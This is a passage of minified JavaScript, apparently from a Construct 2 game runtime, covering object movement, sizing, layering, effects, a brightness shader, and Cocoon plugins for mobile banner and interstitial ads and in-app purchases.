        }, v.prototype.savestatejson = function (t) {
            t.set_string(this.runtime.lastSaveJson)
        }, v.prototype.imagememoryusage = function (t) {
            this.runtime.glwrap ? t.set_float(Math.round(100 * this.runtime.glwrap.estimateVRAM() / 1048576) / 100) : t.set_float(0)
        }, v.prototype.regexsearch = function (t, e, i, n) {
            var r = h(i, n);
            t.set_int(e ? e.search(r) : -1)
        }, v.prototype.regexreplace = function (t, e, i, n, r) {
            var s = h(i, n);
            t.set_string(e ? e.replace(s, r) : "")
        };
        var b = [],
            w = "",
            x = "",
            S = "";

        function T(t, e, i) {
            if (t !== w || e !== x || i !== S) {
                var n = h(e, i);
                b = t.match(n), w = t, x = e, S = i
            }
        }
        v.prototype.regexmatchcount = function (t, e, i, n) {
            h(i, n);
            T(e.toString(), i, n), t.set_int(b ? b.length : 0)
        }, v.prototype.regexmatchat = function (t, e, i, n, r) {
            r = Math.floor(r);
            h(i, n);
            T(e.toString(), i, n), !b || r < 0 || r >= b.length ? t.set_string("") : t.set_string(b[r])
        }, v.prototype.infinity = function (t) {
            t.set_float(1 / 0)
        }, v.prototype.setbit = function (t, e, i, n) {
            e |= 0, i |= 0, n = 0 !== n ? 1 : 0, t.set_int(e & ~(1 << i) | n << i)
        }, v.prototype.togglebit = function (t, e, i) {
            e |= 0, i |= 0, t.set_int(e ^ 1 << i)
        }, v.prototype.getbit = function (t, e, i) {
            e |= 0, i |= 0, t.set_int(e & 1 << i ? 1 : 0)
        }, v.prototype.originalwindowwidth = function (t) {
            t.set_int(this.runtime.original_width)
        }, v.prototype.originalwindowheight = function (t) {
            t.set_int(this.runtime.original_height)
        }, t.exps = new v, t.runWaits = function () {
            var t, e, i, n, r, s, o, a = this.runtime.getCurrentEventStack();
            for (t = 0, i = this.waits.length; t < i; t++) {
                if (-1 === (n = this.waits[t]).time) {
                    if (!n.signalled) continue
                } else if (n.time > this.runtime.kahanTime.sum) continue;
                for (r in a.current_event = n.ev, a.actindex = n.actindex, a.cndindex = 0, n.sols) n.sols.hasOwnProperty(r) && (s = this.runtime.types_by_index[parseInt(r, 10)].getCurrentSol(), o = n.sols[r], s.select_all = o.sa, cr.shallowAssignArray(s.instances, o.insts), g(o));
                n.ev.resume_actions_and_subevents(), this.runtime.clearSol(n.solModifiers), n.deleteme = !0
            }
            for (t = 0, e = 0, i = this.waits.length; t < i; t++) n = this.waits[t], this.waits[e] = n, n.deleteme ? d(n) : e++;
            cr.truncateArray(this.waits, e)
        }
    }(),
    function () {
        cr.add_common_aces = function (t, e) {
            var i = t[1],
                n = t[3],
                r = t[4],
                s = t[5],
                o = t[6],
                a = t[7],
                h = t[8];
            e.cnds || (e.cnds = {}), e.acts || (e.acts = {}), e.exps || (e.exps = {});
            var c = e.cnds,
                l = e.acts,
                u = e.exps;
            n && (c.CompareX = function (t, e) {
                return cr.do_cmp(this.x, t, e)
            }, c.CompareY = function (t, e) {
                return cr.do_cmp(this.y, t, e)
            }, c.IsOnScreen = function () {
                var t = this.layer;
                this.update_bbox();
                var e = this.bbox;
                return !(e.right < t.viewLeft || e.bottom < t.viewTop || e.left > t.viewRight || e.top > t.viewBottom)
            }, c.IsOutsideLayout = function () {
                this.update_bbox();
                var t = this.bbox,
                    e = this.runtime.running_layout;
                return t.right < 0 || t.bottom < 0 || t.left > e.width || t.top > e.height
            }, c.PickDistance = function (t, e, i) {
                var n = this.getCurrentSol(),
                    r = n.getObjects();
                if (!r.length) return !1;
                var s, o, a, h = r[0],
                    c = h,
                    l = cr.distanceTo(h.x, h.y, e, i);
                for (s = 1, o = r.length; s < o; s++) h = r[s], a = cr.distanceTo(h.x, h.y, e, i), (0 === t && a < l || 1 === t && a > l) && (l = a, c = h);
                return n.pick_one(c), !0
            }, l.SetX = function (t) {
                this.x !== t && (this.x = t, this.set_bbox_changed())
            }, l.SetY = function (t) {
                this.y !== t && (this.y = t, this.set_bbox_changed())
            }, l.SetPos = function (t, e) {
                this.x === t && this.y === e || (this.x = t, this.y = e, this.set_bbox_changed())
            }, l.SetPosToObject = function (t, e) {
                var i, n, r = t.getPairedInstance(this);
                r && (r.getImagePoint ? (i = r.getImagePoint(e, !0), n = r.getImagePoint(e, !1)) : (i = r.x, n = r.y), this.x === i && this.y === n || (this.x = i, this.y = n, this.set_bbox_changed()))
            }, l.MoveForward = function (t) {
                0 !== t && (this.x += Math.cos(this.angle) * t, this.y += Math.sin(this.angle) * t, this.set_bbox_changed())
            }, l.MoveAtAngle = function (t, e) {
                0 !== e && (this.x += Math.cos(cr.to_radians(t)) * e, this.y += Math.sin(cr.to_radians(t)) * e, this.set_bbox_changed())
            }, u.X = function (t) {
                t.set_float(this.x)
            }, u.Y = function (t) {
                t.set_float(this.y)
            }, u.dt = function (t) {
                t.set_float(this.runtime.getDt(this))
            }), r && (c.CompareWidth = function (t, e) {
                return cr.do_cmp(this.width, t, e)
            }, c.CompareHeight = function (t, e) {
                return cr.do_cmp(this.height, t, e)
            }, l.SetWidth = function (t) {
                this.width !== t && (this.width = t, this.set_bbox_changed())
            }, l.SetHeight = function (t) {
                this.height !== t && (this.height = t, this.set_bbox_changed())
            }, l.SetSize = function (t, e) {
                this.width === t && this.height === e || (this.width = t, this.height = e, this.set_bbox_changed())
            }, u.Width = function (t) {
                t.set_float(this.width)
            }, u.Height = function (t) {
                t.set_float(this.height)
            }, u.BBoxLeft = function (t) {
                this.update_bbox(), t.set_float(this.bbox.left)
            }, u.BBoxTop = function (t) {
                this.update_bbox(), t.set_float(this.bbox.top)
            }, u.BBoxRight = function (t) {
                this.update_bbox(), t.set_float(this.bbox.right)
            }, u.BBoxBottom = function (t) {
                this.update_bbox(), t.set_float(this.bbox.bottom)
            }), s && (c.AngleWithin = function (t, e) {
                return cr.angleDiff(this.angle, cr.to_radians(e)) <= cr.to_radians(t)
            }, c.IsClockwiseFrom = function (t) {
                return cr.angleClockwise(this.angle, cr.to_radians(t))
            }, c.IsBetweenAngles = function (t, e) {
                var i = cr.to_clamped_radians(t),
                    n = cr.to_clamped_radians(e),
                    r = cr.clamp_angle(this.angle);
                return !cr.angleClockwise(n, i) ? !(!cr.angleClockwise(r, i) && cr.angleClockwise(r, n)) : cr.angleClockwise(r, i) && !cr.angleClockwise(r, n)
            }, l.SetAngle = function (t) {
                var e = cr.to_radians(cr.clamp_angle_degrees(t));
                isNaN(e) || this.angle !== e && (this.angle = e, this.set_bbox_changed())
            }, l.RotateClockwise = function (t) {
                0 === t || isNaN(t) || (this.angle += cr.to_radians(t), this.angle = cr.clamp_angle(this.angle), this.set_bbox_changed())
            }, l.RotateCounterclockwise = function (t) {
                0 === t || isNaN(t) || (this.angle -= cr.to_radians(t), this.angle = cr.clamp_angle(this.angle), this.set_bbox_changed())
            }, l.RotateTowardAngle = function (t, e) {
                var i = cr.angleRotate(this.angle, cr.to_radians(e), cr.to_radians(t));
                isNaN(i) || this.angle !== i && (this.angle = i, this.set_bbox_changed())
            }, l.RotateTowardPosition = function (t, e, i) {
                var n = e - this.x,
                    r = i - this.y,
                    s = Math.atan2(r, n),
                    o = cr.angleRotate(this.angle, s, cr.to_radians(t));
                isNaN(o) || this.angle !== o && (this.angle = o, this.set_bbox_changed())
            }, l.SetTowardPosition = function (t, e) {
                var i = t - this.x,
                    n = e - this.y,
                    r = Math.atan2(n, i);
                isNaN(r) || this.angle !== r && (this.angle = r, this.set_bbox_changed())
            }, u.Angle = function (t) {
                t.set_float(cr.to_clamped_degrees(this.angle))
            }), i || (c.CompareInstanceVar = function (t, e, i) {
                return cr.do_cmp(this.instance_vars[t], e, i)
            }, c.IsBoolInstanceVarSet = function (t) {
                return this.instance_vars[t]
            }, c.PickInstVarHiLow = function (t, e) {
                var i = this.getCurrentSol(),
                    n = i.getObjects();
                if (!n.length) return !1;
                var r, s, o, a = n[0],
                    h = a,
                    c = a.instance_vars[e];
                for (r = 1, s = n.length; r < s; r++) o = (a = n[r]).instance_vars[e], (0 === t && o < c || 1 === t && o > c) && (c = o, h = a);
                return i.pick_one(h), !0
            }, c.PickByUID = function (t) {
                var e, i, n, r, s, o, a;
                if (this.runtime.getCurrentCondition().inverted) {
                    if ((a = this.getCurrentSol()).select_all) {
                        for (a.select_all = !1, cr.clearArray(a.instances), cr.clearArray(a.else_instances), e = 0, i = (o = this.instances).length; e < i; e++)(r = o[e]).uid === t ? a.else_instances.push(r) : a.instances.push(r);
                        return this.applySolToContainer(), !!a.instances.length
                    }
                    for (e = 0, n = 0, i = a.instances.length; e < i; e++) r = a.instances[e], a.instances[n] = r, r.uid === t ? a.else_instances.push(r) : n++;
                    return cr.truncateArray(a.instances, n), this.applySolToContainer(), !!a.instances.length
                }
                if (!(r = this.runtime.getObjectByUID(t))) return !1;
                if (!(a = this.getCurrentSol()).select_all && -1 === a.instances.indexOf(r)) return !1;
                if (this.is_family) {
                    for (e = 0, i = (s = r.type.families).length; e < i; e++)
                        if (s[e] === this) return a.pick_one(r), this.applySolToContainer(), !0
                } else if (r.type === this) return a.pick_one(r), this.applySolToContainer(), !0;
                return !1
            }, c.OnCreated = function () {
                return !0
            }, c.OnDestroyed = function () {
                return !0
            }, l.SetInstanceVar = function (t, e) {
                var i = this.instance_vars;
                cr.is_number(i[t]) ? cr.is_number(e) ? i[t] = e : i[t] = parseFloat(e) : cr.is_string(i[t]) && (cr.is_string(e) ? i[t] = e : i[t] = e.toString())
            }, l.AddInstanceVar = function (t, e) {
                var i = this.instance_vars;
                cr.is_number(i[t]) ? cr.is_number(e) ? i[t] += e : i[t] += parseFloat(e) : cr.is_string(i[t]) && (cr.is_string(e) ? i[t] += e : i[t] += e.toString())
            }, l.SubInstanceVar = function (t, e) {
                var i = this.instance_vars;
                cr.is_number(i[t]) && (cr.is_number(e) ? i[t] -= e : i[t] -= parseFloat(e))
            }, l.SetBoolInstanceVar = function (t, e) {
                this.instance_vars[t] = e ? 1 : 0
            }, l.ToggleBoolInstanceVar = function (t) {
                this.instance_vars[t] = 1 - this.instance_vars[t]
            }, l.Destroy = function () {
                this.runtime.DestroyInstance(this)
            }, l.LoadFromJsonString || (l.LoadFromJsonString = function (t) {
                var e, i, n, r;
                try {
                    e = JSON.parse(t)
                } catch (t) {
                    return
                }
                if (this.runtime.loadInstanceFromJSON(this, e, !0), this.afterLoad && this.afterLoad(), this.behavior_insts)
                    for (i = 0, n = this.behavior_insts.length; i < n; ++i)(r = this.behavior_insts[i]).afterLoad && r.afterLoad()
            }), u.Count = function (t) {
                var e, i, n, r = t.object_class.instances.length;
                for (e = 0, i = this.runtime.createRow.length; e < i; e++) n = this.runtime.createRow[e], t.object_class.is_family ? n.type.families.indexOf(t.object_class) >= 0 && r++ : n.type === t.object_class && r++;
                t.set_int(r)
            }, u.PickedCount = function (t) {
                t.set_int(t.object_class.getCurrentSol().getObjects().length)
            }, u.UID = function (t) {
                t.set_int(this.uid)
            }, u.IID = function (t) {
                t.set_int(this.get_iid())
            }, u.AsJSON || (u.AsJSON = function (t) {
                t.set_string(JSON.stringify(this.runtime.saveInstanceToJSON(this, !0)))
            })), o && (c.IsVisible = function () {
                return this.visible
            }, l.SetVisible = function (t) {
                !t != !this.visible && (this.visible = !!t, this.runtime.redraw = !0)
            }, c.CompareOpacity = function (t, e) {
                return cr.do_cmp(cr.round6dp(100 * this.opacity), t, e)
            }, l.SetOpacity = function (t) {
                var e = t / 100;
                e < 0 ? e = 0 : e > 1 && (e = 1), e !== this.opacity && (this.opacity = e, this.runtime.redraw = !0)
            }, u.Opacity = function (t) {
                t.set_float(cr.round6dp(100 * this.opacity))
            }), a && (c.IsOnLayer = function (t) {
                return !!t && this.layer === t
            }, c.PickTopBottom = function (t) {
                var e = this.getCurrentSol(),
                    i = e.getObjects();
                if (!i.length) return !1;
                var n, r, s = i[0],
                    o = s;
                for (n = 1, r = i.length; n < r; n++) s = i[n], 0 === t ? (s.layer.index > o.layer.index || s.layer.index === o.layer.index && s.get_zindex() > o.get_zindex()) && (o = s) : (s.layer.index < o.layer.index || s.layer.index === o.layer.index && s.get_zindex() < o.get_zindex()) && (o = s);
                return e.pick_one(o), !0
            }, l.MoveToTop = function () {
                var t = this.layer,
                    e = t.instances;
                e.length && e[e.length - 1] === this || (t.removeFromInstanceList(this, !1), t.appendToInstanceList(this, !1), this.runtime.redraw = !0)
            }, l.MoveToBottom = function () {
                var t = this.layer,
                    e = t.instances;
                e.length && e[0] === this || (t.removeFromInstanceList(this, !1), t.prependToInstanceList(this, !1), this.runtime.redraw = !0)
            }, l.MoveToLayer = function (t) {
                t && t != this.layer && (this.layer.removeFromInstanceList(this, !0), this.layer = t, t.appendToInstanceList(this, !0), this.runtime.redraw = !0)
            }, l.ZMoveToObject = function (t, e) {
                var i = 0 === t;
                if (e) {
                    var n = e.getFirstPicked(this);
                    n && n.uid !== this.uid && (this.layer.index !== n.layer.index && (this.layer.removeFromInstanceList(this, !0), this.layer = n.layer, n.layer.appendToInstanceList(this, !0)), this.layer.moveInstanceAdjacent(this, n, i), this.runtime.redraw = !0)
                }
            }, u.LayerNumber = function (t) {
                t.set_int(this.layer.number)
            }, u.LayerName = function (t) {
                t.set_string(this.layer.name)
            }, u.ZIndex = function (t) {
                t.set_int(this.get_zindex())
            }), h && (l.SetEffectEnabled = function (t, e) {
                if (this.runtime.glwrap) {
                    var i = this.type.getEffectIndexByName(e);
                    if (!(i < 0)) {
                        var n = 1 === t;
                        this.active_effect_flags[i] !== n && (this.active_effect_flags[i] = n, this.updateActiveEffects(), this.runtime.redraw = !0)
                    }
                }
            }, l.SetEffectParam = function (t, e, i) {
                if (this.runtime.glwrap) {
                    var n = this.type.getEffectIndexByName(t);
                    if (!(n < 0)) {
                        var r = this.type.effect_types[n],
                            s = this.effect_params[n];
                        (e = Math.floor(e)) < 0 || e >= s.length || (1 === this.runtime.glwrap.getProgramParameterType(r.shaderindex, e) && (i /= 100), s[e] !== i && (s[e] = i, r.active && (this.runtime.redraw = !0)))
                    }
                }
            })
        }, cr.set_bbox_changed = function () {
            this.bbox_changed = !0, this.cell_changed = !0, this.type.any_cell_changed = !0, this.runtime.redraw = !0;
            var t, e, i = this.bbox_changed_callbacks;
            for (t = 0, e = i.length; t < e; ++t) i[t](this);
            this.layer.useRenderCells && this.update_bbox()
        }, cr.add_bbox_changed_callback = function (t) {
            t && this.bbox_changed_callbacks.push(t)
        }, cr.update_bbox = function () {
            if (this.bbox_changed) {
                var t = this.bbox,
                    e = this.bquad;
                t.set(this.x, this.y, this.x + this.width, this.y + this.height), t.offset(-this.hotspotX * this.width, -this.hotspotY * this.height), this.angle ? (t.offset(-this.x, -this.y), e.set_from_rotated_rect(t, this.angle), e.offset(this.x, this.y), e.bounding_box(t)) : e.set_from_rect(t), t.normalize(), this.bbox_changed = !1, this.update_render_cell()
            }
        };
        var t = new cr.rect(0, 0, 0, 0);
        cr.update_render_cell = function () {
            if (this.layer.useRenderCells) {
                var e = this.layer.render_grid,
                    i = this.bbox;
                t.set(e.XToCell(i.left), e.YToCell(i.top), e.XToCell(i.right), e.YToCell(i.bottom)), this.rendercells.equals(t) || (this.rendercells.right < this.rendercells.left ? e.update(this, null, t) : e.update(this, this.rendercells, t), this.rendercells.copy(t), this.layer.render_list_stale = !0)
            }
        }, cr.update_collision_cell = function () {
            if (this.cell_changed && this.collisionsEnabled) {
                this.update_bbox();
                var e = this.type.collision_grid,
                    i = this.bbox;
                t.set(e.XToCell(i.left), e.YToCell(i.top), e.XToCell(i.right), e.YToCell(i.bottom)), this.collcells.equals(t) || (this.collcells.right < this.collcells.left ? e.update(this, null, t) : e.update(this, this.collcells, t), this.collcells.copy(t), this.cell_changed = !1)
            }
        }, cr.inst_contains_pt = function (t, e) {
            return !!this.bbox.contains_pt(t, e) && (!!this.bquad.contains_pt(t, e) && (this.tilemap_exists ? this.testPointOverlapTile(t, e) : !(this.collision_poly && !this.collision_poly.is_empty()) || (this.collision_poly.cache_poly(this.width, this.height, this.angle), this.collision_poly.contains_pt(t - this.x, e - this.y))))
        }, cr.inst_get_iid = function () {
            return this.type.updateIIDs(), this.iid
        }, cr.inst_get_zindex = function () {
            return this.layer.updateZIndices(), this.zindex
        }, cr.inst_updateActiveEffects = function () {
            var t, e, i;
            cr.clearArray(this.active_effect_types);
            var n = !0;
            for (t = 0, e = this.active_effect_flags.length; t < e; t++) this.active_effect_flags[t] && (i = this.type.effect_types[t], this.active_effect_types.push(i), i.preservesOpaqueness || (n = !1));
            this.uses_shaders = !!this.active_effect_types.length, this.shaders_preserve_opaqueness = n
        }, cr.inst_toString = function () {
            return "Inst" + this.puid
        }, cr.type_getFirstPicked = function (t) {
            var e, i, n;
            if (t && t.is_contained && t.type != this)
                for (e = 0, i = t.siblings.length; e < i; e++)
                    if ((n = t.siblings[e]).type == this) return n;
            var r = this.getCurrentSol().getObjects();
            return r.length ? r[0] : null
        }, cr.type_getPairedInstance = function (t) {
            var e = this.getCurrentSol().getObjects();
            return e.length ? e[t.get_iid() % e.length] : null
        }, cr.type_updateIIDs = function () {
            if (this.stale_iids && !this.is_family) {
                var t, e;
                for (t = 0, e = this.instances.length; t < e; t++) this.instances[t].iid = t;
                var i = t,
                    n = this.runtime.createRow;
                for (t = 0, e = n.length; t < e; ++t) n[t].type === this && (n[t].iid = i++);
                this.stale_iids = !1
            }
        }, cr.type_getInstanceByIID = function (t) {
            if (t < this.instances.length) return this.instances[t];
            t -= this.instances.length;
            var e, i, n = this.runtime.createRow;
            for (e = 0, i = n.length; e < i; ++e)
                if (n[e].type === this) {
                    if (0 === t) return n[e];
                    --t
                } return null
        }, cr.type_getCurrentSol = function () {
            return this.solstack[this.cur_sol]
        }, cr.type_pushCleanSol = function () {
            this.cur_sol++, this.cur_sol === this.solstack.length ? this.solstack.push(new cr.selection(this)) : (this.solstack[this.cur_sol].select_all = !0, cr.clearArray(this.solstack[this.cur_sol].else_instances))
        }, cr.type_pushCopySol = function () {
            this.cur_sol++, this.cur_sol === this.solstack.length && this.solstack.push(new cr.selection(this));
            var t = this.solstack[this.cur_sol],
                e = this.solstack[this.cur_sol - 1];
            e.select_all ? (t.select_all = !0, cr.clearArray(t.else_instances)) : (t.select_all = !1, cr.shallowAssignArray(t.instances, e.instances), cr.shallowAssignArray(t.else_instances, e.else_instances))
        }, cr.type_popSol = function () {
            this.cur_sol--
        }, cr.type_getBehaviorByName = function (t) {
            var e, i, n, r, s, o = 0;
            if (!this.is_family)
                for (e = 0, i = this.families.length; e < i; e++)
                    for (n = 0, r = (s = this.families[e]).behaviors.length; n < r; n++) {
                        if (t === s.behaviors[n].name) return this.extra.lastBehIndex = o, s.behaviors[n];
                        o++
                    }
            for (e = 0, i = this.behaviors.length; e < i; e++) {
                if (t === this.behaviors[e].name) return this.extra.lastBehIndex = o, this.behaviors[e];
                o++
            }
            return null
        }, cr.type_getBehaviorIndexByName = function (t) {
            return this.getBehaviorByName(t) ? this.extra.lastBehIndex : -1
        }, cr.type_getEffectIndexByName = function (t) {
            var e, i;
            for (e = 0, i = this.effect_types.length; e < i; e++)
                if (this.effect_types[e].name === t) return e;
            return -1
        }, cr.type_applySolToContainer = function () {
            if (this.is_contained && !this.is_family) {
                var t, e, i, n, r, s, o;
                this.updateIIDs();
                var a = (s = this.getCurrentSol()).select_all,
                    h = this.runtime.getCurrentEventStack(),
                    c = h && h.current_event && h.current_event.orblock;
                for (t = 0, e = this.container.length; t < e; t++)
                    if ((r = this.container[t]) !== this && (r.updateIIDs(), (o = r.getCurrentSol()).select_all = a, !a)) {
                        for (cr.clearArray(o.instances), i = 0, n = s.instances.length; i < n; ++i) o.instances[i] = r.getInstanceByIID(s.instances[i].iid);
                        if (c)
                            for (cr.clearArray(o.else_instances), i = 0, n = s.else_instances.length; i < n; ++i) o.else_instances[i] = r.getInstanceByIID(s.else_instances[i].iid)
                    }
            }
        }, cr.type_toString = function () {
            return "Type" + this.sid
        }, cr.do_cmp = function (t, e, i) {
            if (void 0 === t || void 0 === i) return !1;
            switch (e) {
                case 0:
                    return t === i;
                case 1:
                    return t !== i;
                case 2:
                    return t < i;
                case 3:
                    return t <= i;
                case 4:
                    return t > i;
                case 5:
                    return t >= i;
                default:
                    return !1
            }
        }
    }(), cr.shaders = {}, cr.shaders.brightness = {
        src: ["varying mediump vec2 vTex;", "uniform lowp sampler2D samplerFront;", "uniform lowp float brightness;", "void main(void)", "{", "lowp vec4 front = texture2D(samplerFront, vTex);", "lowp float a = front.a;", "if (a != 0.0)", "front.rgb /= front.a;", "front.rgb += (brightness - 1.0);", "front.rgb *= a;", "gl_FragColor = front;", "}"].join("\n"),
        extendBoxHorizontal: 0,
        extendBoxVertical: 0,
        crossSampling: !1,
        preservesOpaqueness: !0,
        animated: !1,
        parameters: [
            ["brightness", 0, 1]
        ]
    }, cr.plugins_.ATPAds = function (t) {
        this.runtime = t
    },
    function () {
        var t, e = !1,
            i = !1,
            n = !1,
            r = cr.plugins_.ATPAds.prototype;

        function s() {}

        function o() {}
        r.Type = function (t) {
            this.plugin = t, this.runtime = t.runtime
        }, r.Type.prototype.onCreate = function () {}, r.Instance = function (t) {
            this.type = t, this.runtime = t.runtime
        }, r.Instance.prototype.onCreate = function () {
            if ((this.runtime.isAndroid || this.runtime.isiOS) && "undefined" != typeof Cocoon) {
                switch (this.isShowingBanner = !1, this.isShowingInterstitial = !1, this.androidBannerId = this.properties[0], this.properties[1]) {
                    case 0:
                        this.androidBannerSize = "SMART";
                        break;
                    case 1:
                        this.androidBannerSize = "BANNER";
                        break;
                    case 2:
                        this.androidBannerSize = "MEDIUM_REC";
                        break;
                    case 3:
                        this.androidBannerSize = "LEADERBOARD";
                        break
                }
                switch (this.androidInterstitialId = this.properties[2], this.iosBannerId = this.properties[3], this.properties[4]) {
                    case 0:
                        this.iosBannerSize = "SMART";
                        break;
                    case 1:
                        this.iosBannerSize = "BANNER";
                        break;
                    case 2:
                        this.iosBannerSize = "MEDIUM_REC";
                        break;
                    case 3:
                        this.iosBannerSize = "LEADERBOARD";
                        break
                }
                this.iosInterstitialId = this.properties[5], this.runtime.isAndroid ? (this.bannerAdunit = this.androidBannerId, this.bannerSize = this.androidBannerSize, this.interstitialAdunit = this.androidInterstitialId) : this.runtime.isiOS ? (this.bannerAdunit = this.iosBannerId, this.bannerSize = this.iosBannerSize, this.interstitialAdunit = this.iosInterstitialId) : (this.bannerAdunit = "", this.interstitialAdunit = ""), this.banner = Cocoon.Ad.createBanner(this.bannerAdunit, this.bannerSize), this.interstitial = Cocoon.Ad.createInterstitial(this.interstitialAdunit), t = this, this.banner.on("show", (function () {
                    t.isShowingBanner = !0, t.runtime.trigger(cr.plugins_.ATPAds.prototype.cnds.onBannerShown, t)
                })), this.banner.on("load", (function () {
                    i = !0, t.runtime.trigger(cr.plugins_.ATPAds.prototype.cnds.onBannerLoaded, t)
                })), this.banner.on("click", (function () {
                    t.runtime.trigger(cr.plugins_.ATPAds.prototype.cnds.onBannerClicked, t)
                })), this.banner.on("fail", (function () {
                    i = !1, t.runtime.trigger(cr.plugins_.ATPAds.prototype.cnds.onBannerFailed, t)
                })), this.banner.on("dismiss", (function () {
                    t.isShowingBanner = !1, t.runtime.trigger(cr.plugins_.ATPAds.prototype.cnds.onBannerDismissed, t)
                })), this.interstitial.on("show", (function () {
                    t.isShowingInterstitial = !0, t.runtime.trigger(cr.plugins_.ATPAds.prototype.cnds.onInterstitialShown, t)
                })), this.interstitial.on("load", (function () {
                    n = !0, t.runtime.trigger(cr.plugins_.ATPAds.prototype.cnds.onInterstitialLoaded, t)
                })), this.interstitial.on("click", (function () {
                    t.runtime.trigger(cr.plugins_.ATPAds.prototype.cnds.onInterstitialClicked, t)
                })), this.interstitial.on("fail", (function () {
                    n = !1, t.runtime.trigger(cr.plugins_.ATPAds.prototype.cnds.onInterstitialFailed, t)
                })), this.interstitial.on("dismiss", (function () {
                    t.isShowingInterstitial = !1, n = !1, t.runtime.trigger(cr.plugins_.ATPAds.prototype.cnds.onInterstitialDismissed, t)
                }))
            }
        }, s.prototype.onBannerShown = function () {
            return !0
        }, s.prototype.onBannerHidden = function () {
            return !0
        }, s.prototype.onBannerLoaded = function () {
            return !0
        }, s.prototype.onBannerClicked = function () {
            return !0
        }, s.prototype.onBannerFailed = function () {
            return !0
        }, s.prototype.onBannerDismissed = function () {
            return !0
        }, s.prototype.isShowingBanner = function () {
            return this.isShowingBanner
        }, s.prototype.onInterstitialShown = function () {
            return !0
        }, s.prototype.onInterstitialLoaded = function () {
            return !0
        }, s.prototype.onInterstitialClicked = function () {
            return !0
        }, s.prototype.onInterstitialFailed = function () {
            return !0
        }, s.prototype.onInterstitialDismissed = function () {
            return !0
        }, r.cnds = new s, o.prototype.ShowBanner = function () {
            i ? (e = !0, this.banner.show()) : (this.bannerReady = !1, this.banner.load())
        }, o.prototype.HideBanner = function () {
            e && (e = !1, this.banner.hide())
        }, o.prototype.LoadBanner = function () {
            this.bannerReady = !1, this.banner.load()
        }, s.prototype.isShowingInterstitial = function () {
            return this.isShowingInterstitial
        }, o.prototype.SetLayout = function (t) {
            var e;
            switch (t) {
                case 0:
                    e = "TOP_CENTER";
                    break;
                case 1:
                    e = "BOTTOM_CENTER";
                    break;
                case 2:
                    e = "CUSTOM";
                    break
            }
            this.banner.setLayout(e)
        }, o.prototype.SetPosition = function (t, e) {
            this.banner.setPosition(t, e)
        }, o.prototype.ShowInterstitial = function () {
            n ? this.interstitial.show() : this.interstitial.load()
        }, o.prototype.LoadInterstitial = function () {
            this.interstitial.load()
        }, r.acts = new o
    }(), cr.plugins_.ATPInApps = function (t) {
        this.runtime = t
    },
    function () {
        var t, e = "",
            i = "",
            n = "",
            r = "",
            s = [],
            o = cr.plugins_.ATPInApps.prototype;

        function a() {}

        function h() {}

        function c() {}
        o.Type = function (t) {
            this.plugin = t, this.runtime = t.runtime
        }, o.Type.prototype.onCreate = function () {}, o.Instance = function (t) {
            this.type = t, this.runtime = t.runtime
        }, o.Instance.prototype.onCreate = function () {
            (this.runtime.isAndroid || this.runtime.isiOS) && window.Cocoon && (this.storeService = Cocoon.InApp, this.triggerProduct = "", t = this, this.storeService.canPurchase() && (this.storeService.on("purchase", {
                start: function (e) {
                    t.triggerProduct = e, t.runtime.trigger(cr.plugins_.ATPInApps.prototype.cnds.onPurchaseStart, t)
                },
                error: function (e, i) {
                    t.triggerProduct = e, t.runtime.trigger(cr.plugins_.ATPInApps.prototype.cnds.onPurchaseFail, t)
                },
                complete: function (s) {
                    t.triggerProduct = s.productId, e = s.transactionId, i = s.productId, n = s.quantity, r = s.purchaseDate, t.runtime.trigger(cr.plugins_.ATPInApps.prototype.cnds.onPurchaseComplete, t)
                }
            }), this.storeService.initialize({
                autofinish: !0
            }, (function (t) {}))))
        }, a.prototype.canPurchase = function () {
            return this.storeService.canPurchase()
        }, a.prototype.onPurchaseStart = function (t) {
            return this.triggerProduct === t
        }, a.prototype.onPurchaseComplete = function (t) {
            return this.triggerProduct === t
        }, a.prototype.onPurchaseFail = function (t) {
            return this.triggerProduct === t
        }, a.prototype.isPurchased = function (t) {
            return this.storeService.isPurchased(t)
        }, a.prototype.onProductsFetchComplete = function () {
            return !0
        }, a.prototype.onProductsFetchFail = function () {
            return !0
        }, a.prototype.onConsumeFail = function (t) {
            return this.triggerProduct === t
        }, a.prototype.onConsumeComplete = function (t) {
            return this.triggerProduct === t
        }, a.prototype.onRestorePurchasesComplete = function () {
            return !0
        }, a.prototype.onRestorePurchasesFail = function () {
            return !0
        }, o.cnds = new a, h.prototype.GetProducts = function () {
            this.storeService.canPurchase() && (s = this.storeService.getProducts())
        }, h.prototype.Consume = function (e, i) {
            this.storeService.consume(e, i, (function (i, n) {
                n ? (t.triggerProduct = e, t.runtime.trigger(cr.plugins_.ATPInApps.prototype.cnds.onConsumeFail, t)) : (t.triggerProduct = e, t.runtime.trigger(cr.plugins_.ATPInApps.prototype.cnds.onConsumeComplete, t))
            }))
        }, h.prototype.Purchase = function (t, e) {
            this.storeService.purchase(t, e)
        }, h.prototype.FetchProducts = function (e) {
            this.storeService.fetchProducts(e.split(","), (function (e, i) {
                if (i) t.runtime.trigger(cr.plugins_.ATPInApps.prototype.cnds.onProductsFetchFail, t);
                else {
                    for (var n = e.length - 1; n >= 0; n--);
                    t.runtime.trigger(cr.plugins_.ATPInApps.prototype.cnds.onProductsFetchComplete, t)
                }
            }))
        }, h.prototype.RestorePurchases = function () {
            this.storeService.restorePurchases((function (e) {
                e ? t.runtime.trigger(cr.plugins_.ATPInApps.prototype.cnds.onRestorePurchasesFail, t) : t.runtime.trigger(cr.plugins_.ATPInApps.prototype.cnds.onRestorePurchasesComplete, t)
            }))
        }, o.acts = new h, c.prototype.PurchaseTransactionId = function (t) {
            t.set_string(e)
        }, c.prototype.PurchaseProductId = function (t) {
            t.set_string(i)
        }, c.prototype.PurchaseQuantity = function (t) {
            t.set_int(n)
        }, c.prototype.PurchaseDate = function (t) {
            t.set_string(r)
        }, c.prototype.NumberOfProducts = function (t) {
            t.set_int(s.length)
        }, c.prototype.ProductDescription = function (t, e) {
            (e = Math.floor(e)) < 0 || e >= s.length ? t.set_string("") : t.set_string(s[e].description)
        }, c.prototype.ProductLocalizedPrice = function (t, e) {
            (e = Math.floor(e)) < 0 || e >= s.length ? t.set_string("") : t.set_string(s[e].localizedPrice)
        }, c.prototype.ProductPrice = function (t, e) {
            (e = Math.floor(e)) < 0 || e >= s.length ? t.set_string("") : t.set_string(s[e].price)
        }, c.prototype.ProductId = function (t, e) {
            (e = Math.floor(e)) < 0 || e >= s.length ? t.set_string("") : t.set_string(s[e].productId)
        }, c.prototype.ProductTitle = function (t, e) {
            (e = Math.floor(e)) < 0 || e >= s.length ? t.set_string("") : t.set_string(s[e].title)
